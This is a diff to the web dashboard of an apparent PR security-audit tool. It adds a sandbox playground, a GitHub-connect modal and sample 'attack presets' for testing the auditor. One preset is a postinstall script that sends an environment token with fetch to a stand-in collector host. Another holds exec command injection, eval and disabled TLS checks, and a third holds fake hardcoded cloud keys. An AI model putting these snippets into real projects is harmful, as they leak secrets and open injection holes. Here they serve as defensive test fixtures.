@@ -489,6 +489,139 @@
         border-color: var(--red);
         color: #fecaca;
       }
+      /* Connect GitHub Repo Modal */
+      .modal-backdrop {
+        position: fixed;
+        inset: 0;
+        background: rgba(3, 6, 14, 0.78);
+        backdrop-filter: blur(4px);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        z-index: 100;
+      }
+      .modal-backdrop.open { display: flex; }
+      .modal {
+        width: 100%;
+        max-width: 640px;
+        max-height: 90vh;
+        overflow-y: auto;
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        box-shadow: 0 24px 60px rgba(0, 0, 0, 0.65);
+      }
+      .modal-head {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 16px 20px;
+        border-bottom: 1px solid var(--border);
+      }
+      .modal-head h2 { margin: 0; font-size: 16px; }
+      .modal-body { padding: 18px 20px 22px; font-size: 13px; }
+      .modal-section { margin-bottom: 18px; }
+      .modal-section:last-child { margin-bottom: 0; }
+      .modal-section h3 {
+        margin: 0 0 8px;
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        color: var(--accent-2);
+      }
+      .copy-row {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-bottom: 8px;
+      }
+      .copy-row:last-child { margin-bottom: 0; }
+      .copy-code {
+        flex: 1;
+        padding: 8px 10px;
+        border-radius: 8px;
+        background: #05070d;
+        border: 1px solid var(--border);
+        font-family: var(--mono);
+        font-size: 12px;
+        color: #e2e8f0;
+        overflow-x: auto;
+        white-space: nowrap;
+      }
+      .checklist {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+        display: grid;
+        gap: 6px;
+      }
+      .checklist li {
+        padding: 8px 10px;
+        border-radius: 8px;
+        background: var(--panel-2);
+        border: 1px solid var(--border);
+        font-size: 12.5px;
+      }
+      /* Sandbox 2-tab Panel */
+      .demo-bar {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 12px;
+      }
+      .sandbox-head {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+      .sandbox-tabs {
+        display: flex;
+        gap: 6px;
+      }
+      .sandbox-pane { display: none; }
+      .sandbox-pane.active { display: block; }
+      .sandbox-row {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+        align-items: center;
+      }
+      .custom-grid {
+        display: grid;
+        grid-template-columns: 1fr 240px;
+        gap: 8px;
+        margin-bottom: 8px;
+      }
+      @media (max-width: 720px) {
+        .custom-grid { grid-template-columns: 1fr; }
+      }
+      textarea.code-input {
+        width: 100%;
+        min-height: 130px;
+        font-family: var(--mono);
+        font-size: 12px;
+        line-height: 1.5;
+        background: #05070d;
+        color: #e6ecf8;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 10px 12px;
+        resize: vertical;
+      }
+      .preset-btn {
+        font-size: 12px;
+        padding: 5px 10px;
+        background: rgba(109, 124, 255, 0.12);
+        border-color: rgba(109, 124, 255, 0.35);
+        color: #c7d2fe;
+      }
+      button.connect-btn {
+        background: rgba(34, 211, 238, 0.12);
+        border-color: rgba(34, 211, 238, 0.4);
+        color: #a5f3fc;
+      }
     </style>
   </head>
   <body>
@@ -530,6 +663,7 @@
           </div>
         </div>
         <div class="controls">
+          <button class="connect-btn" id="open-connect-btn">Connect GitHub Repo</button>
           <span class="pill" id="mode-pill"><span class="dot" id="mode-dot"></span><span id="mode-text">Connecting…</span></span>
           <span class="pill" id="refresh-pill">Auto-refresh 5s</span>
           <button id="toggle-auto">Pause</button>
@@ -538,15 +672,44 @@
       </header>
 
       <section class="demo-bar" id="demo-bar">
-        <div class="left">
-          <strong>Local Sandbox Mode active:</strong> trigger realistic PR audits against the isolated Sprite pipeline without real GitHub tokens.
+        <div class="sandbox-head">
+          <div class="left">
+            <strong>Interactive Sandbox Playground:</strong> run zero-trust PR audits against the isolated Sprite pipeline.
+          </div>
+          <div class="sandbox-tabs">
+            <button type="button" class="tab-btn active" data-sandbox-tab="fixtures">Demo PR Fixtures</button>
+            <button type="button" class="tab-btn" data-sandbox-tab="custom">Audit Custom Code / Diff</button>
+          </div>
         </div>
-        <div class="controls">
-          <select id="demo-kind">
-            <option value="vulnerable">Vulnerable PR (Stripe/AWS/.env Leaks + Canary Exfil)</option>
-            <option value="clean">Clean PR (Safe Input Validation)</option>
-          </select>
-          <button class="primary" id="run-demo-btn">Run Demo PR Audit</button>
+
+        <div class="sandbox-pane active" id="sandbox-pane-fixtures">
+          <div class="sandbox-row">
+            <select id="demo-kind">
+              <option value="vulnerable">Vulnerable PR (Stripe/AWS/.env Leaks + Canary Exfil)</option>
+              <option value="clean">Clean PR (Safe Input Validation)</option>
+            </select>
+            <button class="primary" id="run-demo-btn">Run Demo PR Audit</button>
+          </div>
+        </div>
+
+        <div class="sandbox-pane" id="sandbox-pane-custom">
+          <div class="sandbox-row" style="margin-bottom:8px">
+            <span class="muted" style="font-size:12px">Attack Presets:</span>
+            <button type="button" class="preset-btn" data-preset="leaked-keys">Leaked Cloud Keys</button>
+            <button type="button" class="preset-btn" data-preset="malicious-egress">Malicious Install Egress</button>
+            <button type="button" class="preset-btn" data-preset="cmd-injection">Command Injection</button>
+          </div>
+          <form id="custom-audit-form">
+            <div class="custom-grid">
+              <input type="text" id="custom-title" placeholder="PR Title (e.g., feat(auth): add cloud storage uploader)" value="feat(cloud): add storage client config" />
+              <input type="text" id="custom-filename" placeholder="Filename (e.g., src/config.mjs)" value="src/config.mjs" />
+            </div>
+            <textarea class="code-input" id="custom-code" placeholder="Paste JavaScript/TypeScript/Python code, .env content, or a unified git diff to audit..."></textarea>
+            <div class="sandbox-row" style="margin-top:8px;justify-content:space-between">
+              <span class="muted" style="font-size:12px">Creates a synthetic PR via LocalGitHubSimulator and runs the full 3-layer audit + patch verifier.</span>
+              <button type="submit" class="primary" id="run-custom-btn">Run Zero-Trust Audit</button>
+            </div>
+          </form>
         </div>
       </section>
 
@@ -615,6 +778,52 @@
           </tbody>
         </table>
       </section>
+    </div>
+
+    <div class="modal-backdrop" id="connect-modal" role="dialog" aria-modal="true" aria-labelledby="connect-modal-title">
+      <div class="modal">
+        <div class="modal-head">
+          <h2 id="connect-modal-title">Connect a GitHub Repository</h2>
+          <button type="button" id="close-connect-btn">Close</button>
+        </div>
+        <div class="modal-body">
+          <div class="modal-section">
+            <h3>1. Webhook Endpoint (Settings → Webhooks → Add webhook)</h3>
+            <div class="copy-row">
+              <div class="copy-code" id="webhook-url-display"></div>
+              <button type="button" id="copy-webhook-url">Copy</button>
+            </div>
+            <div class="muted" style="font-size:12px">
+              Set Content type to <span class="mono">application/json</span> and Secret to your <span class="mono">GITHUB_WEBHOOK_SECRET</span> (verified via <span class="mono">X-Hub-Signature-256</span>).
+            </div>
+          </div>
+
+          <div class="modal-section">
+            <h3>2. Webhook Events &amp; Zero-Trust Split Connector Permissions</h3>
+            <ul class="checklist">
+              <li>✅ <strong>Webhook Events:</strong> Subscribe to <strong>Pull requests</strong> (<span class="mono">opened, synchronize, reopened, closed</span>) and <strong>Issue comments</strong> (<span class="mono">created</span>).</li>
+              <li>🔒 <strong>Read-Only Connector:</strong> <span class="mono">contents:read</span>, <span class="mono">pull_requests:read</span>, <span class="mono">metadata:read</span> — clones &amp; audits PRs; raw GitHub tokens never enter Sprites.</li>
+              <li>🚀 <strong>Write Connector (Trusted Publisher):</strong> <span class="mono">contents:write</span>, <span class="mono">pull_requests:write</span>, <span class="mono">issues:write</span> — commits verified patches strictly after maintainer approval.</li>
+            </ul>
+          </div>
+
+          <div class="modal-section">
+            <h3>3. Interactive Pull Request Commands</h3>
+            <div class="copy-row">
+              <div class="copy-code">/spriteguard approve</div>
+              <button type="button" data-copy-cmd="/spriteguard approve">Copy</button>
+            </div>
+            <div class="copy-row">
+              <div class="copy-code">/spriteguard rescan</div>
+              <button type="button" data-copy-cmd="/spriteguard rescan">Copy</button>
+            </div>
+            <div class="copy-row">
+              <div class="copy-code">@spriteguard Why was this finding flagged and is it exploitable?</div>
+              <button type="button" data-copy-cmd="@spriteguard Why was this finding flagged and is it exploitable?">Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <div class="toast" id="toast"></div>
@@ -949,9 +1158,10 @@
         const activeSelEnd = activeAskScanId ? activeEl.selectionEnd : null;
 
         const isLocal = data.mode === 'local-sandbox';
+        const isPlayground = isLocal || Boolean(data.playgroundEnabled);
         document.getElementById('mode-text').textContent = isLocal ? 'Local Sandbox Mode' : 'Production (Fly Sprites)';
         document.getElementById('mode-dot').classList.toggle('warn', isLocal);
-        document.getElementById('demo-bar').classList.toggle('visible', isLocal);
+        document.getElementById('demo-bar').classList.toggle('visible', isPlayground);
 
         const s = data.stats || {};
         document.getElementById('kpi-prs').textContent = String(s.prsAudited ?? 0);
@@ -989,7 +1199,7 @@
               '<td><span class="badge status-' + esc(item.status) + '">' + esc(patchStatusLabel(item)) + '</span></td>' +
               '<td class="mono muted">' + esc(item.spriteState) + '</td>' +
               '<td>' +
-                (isLocal && item.status === 'awaiting_approval'
+                (isPlayground && item.status === 'awaiting_approval'
                   ? '<button class="approve" data-approve="' + esc(item.id) + '"' + (isApproving ? ' disabled' : '') + '>' +
                     (isApproving ? '<span class="spinner"></span>Waking Sprite &amp; Pushing...' : 'Approve Patch') +
                     '</button> '
@@ -1000,7 +1210,7 @@
           );
 
           if (isOpen) {
-            rows.push(renderDetailRow(item, isLocal));
+            rows.push(renderDetailRow(item, isPlayground));
           }
         }
         tbody.innerHTML = rows.join('');
@@ -1232,12 +1442,141 @@
         document.getElementById('refresh-pill').textContent = state.auto ? 'Auto-refresh 5s' : 'Auto-refresh paused';
       }
 
+      const ATTACK_PRESETS = {
+        'leaked-keys': {
+          title: 'feat(cloud): wire AWS S3 & Stripe billing credentials',
+          filename: 'src/cloudConfig.mjs',
+          code: [
+            '// Hardcoded production credentials accidentally committed',
+            "export const AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPL9';",
+            "export const STRIPE_SECRET_KEY = 'sk_live_51H9xFakeDemoKey99887766554433221100';",
+            "export const DATABASE_URL = 'postgres://admin:ProdSecretPass99@db.internal:5432/app';",
+            '',
+            'export function getConfig() {',
+            '  return { ready: Boolean(AWS_ACCESS_KEY_ID && STRIPE_SECRET_KEY) };',
+            '}',
+          ].join('\n'),
+        },
+        'malicious-egress': {
+          title: 'chore(deps): add build telemetry postinstall script',
+          filename: 'scripts/postinstall.mjs',
+          code: [
+            '// Exfiltrates CI/Sprite environment variables to an untrusted collector',
+            'export async function reportInstallTelemetry() {',
+            '  const token = process.env.SPRITEGUARD_CANARY_KEY || process.env.AWS_ACCESS_KEY_ID || "";',
+            '  await fetch(`http://exfil-collector.invalid/beacon?k=${encodeURIComponent(token)}`, {',
+            '    method: "POST",',
+            '    signal: AbortSignal.timeout(150),',
+            '  }).catch(() => {});',
+            '}',
+            'void reportInstallTelemetry();',
+          ].join('\n'),
+        },
+        'cmd-injection': {
+          title: 'feat(ops): add diagnostic ping & dynamic rule evaluator',
+          filename: 'src/diagnostics.mjs',
+          code: [
+            'import { exec } from "node:child_process";',
+            'import https from "node:https";',
+            '',
+            'export const insecureAgent = new https.Agent({ rejectUnauthorized: false });',
+            '',
+            'export function pingHost(userHost, cb) {',
+            '  return exec(`ping -c 1 ${userHost}`, cb);',
+            '}',
+            '',
+            'export function evalRule(expr) {',
+            '  return eval(expr);',
+            '}',
+          ].join('\n'),
+        },
+      };
+
+      function switchSandboxTab(tab) {
+        document.querySelectorAll('button[data-sandbox-tab]').forEach((b) => {
+          b.classList.toggle('active', b.getAttribute('data-sandbox-tab') === tab);
+        });
+        document.getElementById('sandbox-pane-fixtures').classList.toggle('active', tab === 'fixtures');
+        document.getElementById('sandbox-pane-custom').classList.toggle('active', tab === 'custom');
+      }
+
+      function applyAttackPreset(key) {
+        const preset = ATTACK_PRESETS[key];
+        if (!preset) return;
+        document.getElementById('custom-title').value = preset.title;
+        document.getElementById('custom-filename').value = preset.filename;
+        document.getElementById('custom-code').value = preset.code;
+      }
+
+      async function runCustomAudit(ev) {
+        ev.preventDefault();
+        const btn = document.getElementById('run-custom-btn');
+        const title = document.getElementById('custom-title').value.trim();
+        const filename = document.getElementById('custom-filename').value.trim();
+        const code = document.getElementById('custom-code').value;
+        if (!code.trim()) {
+          toast('Paste code or choose an attack preset first.', 'error');
+          return;
+        }
+        btn.disabled = true;
+        btn.innerHTML = '<span class="spinner"></span>Auditing in Isolated Sprite...';
+        try {
+          const res = await fetch('/api/demo/custom', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', ...authHeaders() },
+            body: JSON.stringify({ title, filename, code }),
+          });
+          const data = await res.json();
+          if (!res.ok) throw new Error(data.error || 'Custom audit failed');
+          state.expandedId = data.scan.id;
+          toast('Custom PR #' + data.scan.prNumber + ' audited (Risk ' + data.scan.riskScore + '/100)', 'success');
+          await fetchScans();
+        } catch (err) {
+          toast('Error: ' + err.message, 'error');
+        } finally {
+          btn.disabled = false;
+          btn.textContent = 'Run Zero-Trust Audit';
+        }
+      }
+
+      function openConnectModal() {
+        const urlEl = document.getElementById('webhook-url-display');
+        if (urlEl) urlEl.textContent = window.location.origin + '/webhook';
+        document.getElementById('connect-modal').classList.add('open');
+      }
+
+      function closeConnectModal() {
+        document.getElementById('connect-modal').classList.remove('open');
+      }
+
       document.getElementById('toggle-auto').addEventListener('click', () => {
         state.auto = !state.auto;
         setupRefresh();
       });
       document.getElementById('refresh-now').addEventListener('click', fetchScans);
       document.getElementById('run-demo-btn').addEventListener('click', runDemo);
+      document.getElementById('custom-audit-form').addEventListener('submit', runCustomAudit);
+      document.querySelectorAll('button[data-sandbox-tab]').forEach((btn) => {
+        btn.addEventListener('click', () => switchSandboxTab(btn.getAttribute('data-sandbox-tab')));
+      });
+      document.querySelectorAll('button[data-preset]').forEach((btn) => {
+        btn.addEventListener('click', () => applyAttackPreset(btn.getAttribute('data-preset')));
+      });
+      document.getElementById('open-connect-btn').addEventListener('click', openConnectModal);
+      document.getElementById('close-connect-btn').addEventListener('click', closeConnectModal);
+      document.getElementById('connect-modal').addEventListener('click', (ev) => {
+        if (ev.target.id === 'connect-modal') closeConnectModal();
+      });
+      document.addEventListener('keydown', (ev) => {
+        if (ev.key === 'Escape') closeConnectModal();
+      });
+      document.getElementById('copy-webhook-url').addEventListener('click', (ev) => {
+        copyMarkdownText(window.location.origin + '/webhook', ev.currentTarget);
+      });
+      document.querySelectorAll('button[data-copy-cmd]').forEach((btn) => {
+        btn.addEventListener('click', () => copyMarkdownText(btn.getAttribute('data-copy-cmd'), btn));
+      });
+      applyAttackPreset('leaked-keys');
 
       fetchScans();
       setupRefresh();
